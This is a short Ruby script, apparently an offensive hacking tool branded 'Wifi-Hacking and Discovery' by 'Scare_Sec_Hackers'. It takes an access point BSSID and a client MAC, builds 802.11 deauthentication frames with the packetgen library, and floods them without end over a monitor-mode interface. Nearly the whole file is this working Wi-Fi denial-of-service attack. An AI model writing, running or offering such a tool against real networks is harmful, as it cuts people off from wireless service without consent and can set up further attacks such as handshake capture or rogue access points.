require 'colorize'
require 'packetgen'


def main
    puts <<-'EOF'.colorize(:red)
 _  _  _  _____   _____  _______ _______  ______
 |  |  | |     | |     | |______ |______ |_____/
 |__|__| |_____| |_____| |       |______ |    \_
                                                
    Wifi-Hacking and Discovery
                            V 2.0
                                 Scare_Sec_Hackers
 ──────────────────────────────────────────────
            __
         __/o \_
         \____  \
             /   \
       __   //\   \
    __/o \-//--\   \_/
    \____  ___  \  |
         ||   \ |\ |
        _||   _||_||
    EOF
end


def deauth
    packnum = "100000000000000"
    iface = 'mon0'
    print("Access Point ~~> ").
    bssid  = gets.chomp
    puts '-----------------------'
    print("Destination  ~~> ").
    client = gets.chomp
    while true
        pkt = PacketGen.gen('RadioTap').
                        add('Dot11::Management', mac1: client, mac2: bssid, mac3: bssid).
                        add('Dot11::DeAuth', reason: 7)
        puts "Sending Defualt Amount  -> " + packnum 
        puts "[+] Sending Deauth Using --> " + iface + ' to Acess Point --> ' + bssid + 'Too Client --> ' + client 
        pkt.to_w(iface, calc: true, number: 100000000000000, interval: 0.2)
    end
end

system("clear")
main()
deauth()